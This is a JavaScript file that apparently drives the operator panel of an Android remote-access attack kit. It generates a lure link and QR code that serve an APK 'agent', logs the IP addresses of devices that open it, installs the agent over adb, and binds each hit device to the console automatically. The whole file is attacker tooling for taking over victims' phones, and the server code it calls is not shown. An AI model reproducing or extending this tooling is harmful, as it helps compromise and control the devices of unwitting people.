var linkSid = "";

function linkPost(data, cb) {
  $.post("process/link.php", data, function (r) { cb(r); }, "json").fail(function (x) {
    cb({ ok: false, error: (x.responseJSON && x.responseJSON.error) || x.statusText });
  });
}

$("#link-arm").click(function () {
  var name = $("#link-name").val() || "link";
  $("#link-arm").prop("disabled", true).text("building agent\u2026");
  linkPost({ action: "arm", name: name }, function (r) {
    $("#link-arm").prop("disabled", false).text("Generate link");
    if (!r.ok) { alert("arm failed: " + r.error); return; }
    linkSid = r.sid;
    $("#link-out").show();
    $("#link-url").val(r.url);
    if (r.qr) $("#link-qr").attr("src", r.qr);
    $("#link-state").text("apk: " + (r.apk || "(none)") + "  " + r.apk_bytes + " bytes\nstate: armed");
    linkRefresh();
  });
});

$("#link-copy").click(function () {
  var el = document.getElementById("link-url");
  el.select(); document.execCommand("copy");
});
$("#link-refresh").click(linkRefresh);
$("#link-attach").click(function () {
  if (!linkSid) return;
  linkPost({ action: "attach", sid: linkSid }, function (r) {
    if (!r.ok) { $("#link-state").append("\nattach: " + (r.error || "failed")); return; }
    $("#link-state").append("\nattached session '" + r.session + "' -> " + r.device + "  (reloading)");
    setTimeout(function () { location.reload(); }, 800);
  });
});
$("#link-install").click(function () {
  if (!linkSid) return;
  linkPost({ action: "install", sid: linkSid }, function (r) {
    $("#link-state").append("\ninstall: " + JSON.stringify(r));
  });
});

var linkAutoTried = false;

function linkRefresh() {
  if (!linkSid) return;
  linkPost({ action: "status", sid: linkSid }, function (r) {
    if (!r.ok) return;
    var s = r.state || {};
    var seen = (s.first_seen || {}).ip;
    $("#link-state").text(
      "state: " + (s.adb || "unpaired") +
      "\nfirst seen: " + (seen || "-") +
      "\nlast seen:  " + ((s.last_seen || {}).ip || "-") +
      "\ndevices on adb: " + (r.devices || []).join(", ")
    );
    // A device has been hit -- grab it for the console with no button press.
    if (seen && !linkAutoTried) {
      linkAutoTried = true;
      linkPost({ action: "autobind", sid: linkSid }, function (b) {
        if (!b.ok || !b.bound) { linkAutoTried = false; return; }
        $("#link-state").append("\nbound -> " + b.device + "  (reloading)");
        setTimeout(function () { location.reload(); }, 900);
      });
    }
  });
}

$("#link-probe-go").click(function () {
  var u = $("#link-probe").val();
  linkPost({ action: "probe", url: u }, function (r) {
    $("#link-probe-out").text(JSON.stringify(r, null, 1));
  });
});

// Refresh status while the tab is open, so a hit shows up without a reload.
setInterval(function () { if (linkSid) linkRefresh(); }, 4000);
